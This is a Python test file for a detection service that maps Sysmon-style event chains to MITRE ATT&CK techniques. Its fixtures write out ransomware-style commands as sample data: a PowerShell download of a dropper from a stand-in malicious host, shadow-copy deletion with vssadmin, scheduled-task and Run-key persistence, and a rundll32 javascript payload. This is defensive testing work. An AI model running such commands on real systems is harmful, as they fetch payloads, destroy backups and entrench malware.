from app.services.mitre_mapper import map_chain_to_mitre


def _technique_ids(mapped: list[dict[str, str]]) -> set[str]:
    return {technique["technique_id"] for technique in mapped}


def test_map_chain_to_mitre_detects_ransomware_related_behaviors():
    chain = {
        "actions": [
            {
                "event_id": "1",
                "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "command_line": (
                    "powershell.exe -EncodedCommand "
                    "Invoke-WebRequest http://malicious.example.com/dropper.exe"
                ),
            },
            {
                "event_id": "1",
                "image": r"C:\Windows\System32\cmd.exe",
                "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet",
            },
            {
                "event_id": "11",
                "image": r"C:\Users\Public\encryptor.exe",
                "target_filename": r"C:\Users\analyst\Documents\budget.xlsx.locked",
            },
            {
                "event_id": "1",
                "image": r"C:\Windows\System32\schtasks.exe",
                "command_line": (
                    "schtasks /create /tn updater /tr "
                    r"C:\Users\Public\dropper.exe /sc minute"
                ),
            },
        ]
    }

    technique_ids = _technique_ids(map_chain_to_mitre(chain))
    mapped = map_chain_to_mitre(chain)
    t1490 = next(item for item in mapped if item["technique_id"] == "T1490")
    t1486 = next(item for item in mapped if item["technique_id"] == "T1486")

    assert "T1059.001" in technique_ids
    assert "T1059.003" in technique_ids
    assert "T1105" in technique_ids
    assert "T1490" in technique_ids
    assert "T1486" in technique_ids
    assert "T1053.005" in technique_ids
    assert t1490["confidence"] in {"low", "medium", "high"}
    assert "vssadmin delete shadows" in t1490["evidence"][0]
    assert t1486["evidence"] == [r"C:\Users\analyst\Documents\budget.xlsx.locked"]


def test_map_chain_to_mitre_uses_context_fields_and_deduplicates():
    chain = {
        "actions": [
            {
                "event_id": "13",
                "image": r"C:\Windows\System32\reg.exe",
                "target_object": (
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater"
                ),
                "details": r"C:\Users\Public\dropper.exe",
            },
            {
                "event_id": "1",
                "image": r"C:\Windows\System32\rundll32.exe",
                "command_line": "rundll32.exe javascript:payload",
            },
            {
                "event_id": "1",
                "image": r"C:\Windows\System32\rundll32.exe",
                "command_line": "rundll32.exe javascript:payload",
            },
        ]
    }

    mapped = map_chain_to_mitre(chain)
    technique_ids = _technique_ids(mapped)

    assert technique_ids == {"T1112", "T1218"}
    assert len(mapped) == 2

    t1218 = next(item for item in mapped if item["technique_id"] == "T1218")
    assert t1218["evidence"] == ["rundll32.exe javascript:payload"]
    assert t1218["confidence"] == "low"


def test_map_chain_to_mitre_merges_evidence_and_keeps_highest_confidence():
    chain = {
        "actions": [
            {
                "event_id": "13",
                "target_object": (
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater"
                ),
            },
            {
                "event_id": "1",
                "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            },
        ]
    }

    mapped = map_chain_to_mitre(chain)
    t1112 = next(item for item in mapped if item["technique_id"] == "T1112")

    assert t1112["confidence"] == "medium"
    assert len(t1112["evidence"]) == 3
    assert "Sysmon event ID 13" in t1112["evidence"]
    assert "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" in t1112["evidence"]
